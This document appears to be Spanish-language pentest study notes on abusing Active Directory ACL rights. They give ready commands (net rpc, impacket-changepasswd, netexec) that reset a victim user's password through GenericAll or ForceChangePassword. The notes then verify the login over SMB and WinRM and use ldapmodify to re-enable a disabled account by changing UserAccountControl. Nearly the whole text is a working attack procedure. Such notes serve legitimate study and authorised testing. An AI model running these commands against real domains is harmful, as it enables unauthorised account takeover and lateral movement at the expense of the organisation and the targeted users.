# Abuso ACL 

Tags: #AD #ACL #Linux #Pywhisker #Gettgtpkinit #Net 

## GenerciAll sobre Usuario (ChangePassword)

```bash 
Paso 1:
❯ net rpc password 'TargetUser' 'P@$$w0rd123!' -U domain.corp/user%'passwd' -S IP_DC
# Cambia la contraseña sin conocer la actual
	# TargetUser     = Usuario víctima (el que quieres cambiar)
	# P@$$w0rd123!   = Nueva contraseña que le pones a la víctima
	# user%passwd    = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
	# IP_DC          = IP del Domain Controller

Opción 2 - Más limpio que net rpc en entornos modernos
❯ impacket-changepasswd 'domain.corp/TargetUser@IP_DC' -altuser ControlledUser -altpass 'Password1' -newpass 'P@$$w0rd123!' -reset -dc-ip IP_DC

	# TargetUser@IP_DC = Usuario víctima (el que quieres cambiar)
	# altuser          = Usuario atacante (quien tiene GenericAll / ForceChangePassword)
	# altpass          = Contraseña del usuario atacante
	# newpass          = Nueva contraseña para la víctima
	# -reset           = Fuerza el cambio sin conocer la contraseña actual
	# dc-ip            = IP del Domain Controller

Opción 3 - Alternativa con netexec
❯ nxc smb <IP_DC> -u 'user' -p 'passwd' -M change-password -o USER=targetuser NEWPASS='P@$$w0rd123!'

	# IP_DC           = IP del Domain Controller
	# user / passwd   = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
	# USER=TargetUser = Usuario víctima (el que quieres cambiar)
	# NEWPASS         = Nueva contraseña para la víctima
```

```bash 
Paso 2:
# Verificar el cambio de password 
❯ nxc smb IP_DC -u "TargetUser" -p 'P@$$w0rd123!' 

# Verificar el ingreso por EvilWinRM
❯ nxc winrm IP_DC -u "TargetUser" -p 'P@$$w0rd123!'
```

## Si la cuenta esta deshabilitada 
```bash 
# Obtener los datos del usuario a caambiar 
❯ ldapsearch -x -H ldap://IP_DC -D 'user@domain.local' -W -b 'DC=domain,DC=local' "(SAMAccountName=adam.silver)"

Donde:
	- El campo que dice si la cuenta es habilitada o no es 'UserAccountControl'
	- Si tiene el valor de '66048' esta habilitada 
	- Si tiene el valor de '66050' esta deshabilitada 


# Habilitar la cuenta 
❯ ldapmodify -x -H ldap://IP_DC -D 'ControlledUser@domain.local' -W <<EOF
	heredoc> dn: CN=Adam D. Silver,CN=Users,DC=domain,DC=local
	heredoc> changetype: modify
	heredoc> replace: UserAccountControl 
	heredoc> UserAccountControl: 66048
	heredoc> EOF
```